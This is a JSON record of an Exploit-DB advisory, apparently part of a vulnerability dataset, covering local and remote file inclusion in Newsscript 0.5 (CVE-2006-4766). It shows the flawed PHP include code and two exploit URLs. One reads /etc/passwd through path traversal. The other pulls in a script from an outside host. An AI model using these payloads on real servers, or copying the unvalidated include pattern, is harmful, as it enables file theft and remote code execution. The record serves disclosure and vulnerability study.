{
  "id": "2365",
  "title": "Newsscript 0.5 - Local/Remote File Inclusion",
  "cve": "CVE-2006-4766",
  "vuln_type": "path_traversal",
  "code": "#  Product : Newsscript\r\n\r\n#  Homepage : http://www.webmaster-journal.com\r\n\r\n#  Version : 0.5\r\n\r\n#  Date : 12-09-2006\r\n\r\n#  Vulnerability : Remote & local File Inclusion\r\n\r\n#  Risk : High\r\n\r\n---------------------------------------------------------------------------------------------------------\r\n\r\n\r\n#  Description :\r\n\r\nNewsscript is a PHP script to manage news items on website without Database.\r\n\r\n\r\n#  Vulnerable Code :\r\n\r\nThe first issue is due to an input validation error in the \"print/print.php\" script that does not validate the \"ide\" parameter, which could be exploited by remote attackers to include local files with the privileges of the web server.\r\n\r\n1    <html>\r\n2    <head>\r\n3    <?\r\n4 $file_name = \"../\".$ide.\".txt\";\r\n5    ?>\r\n\r\n\r\n27    include($file_name);\r\n\r\n\r\nThe second flaw is due to an input validation error in the \"article.php\" script that does not validate the \"ide\" parameter, which could be exploited by attackers to include remote or local files and execute arbitrary commands with privileges of the web server.\r\n\r\n1 <?\r\n2 include($ide.\".txt\");\r\n3 ?>\r\n\r\n\r\n#  Exploit :\r\n\r\nhttp://localhost/newscript/print/print.php?ide=../../../../etc/passwd%00\r\n\r\nhttp://localhost/newscript/article.php?ide=http://site.com/script.txt ?\r\n\r\n\r\n#  Solution :\r\n\r\nUpdate to a newer version\r\n\r\n\r\n#  Discovered By:\r\n\r\nDaftrix[at]Gmail.com\r\nDaftrix Security Investigations\r\nhttp://www.Daftrix.com\r\n\r\n# milw0rm.com [2006-09-13]",
  "url": "https://www.exploit-db.com/exploits/2365"
}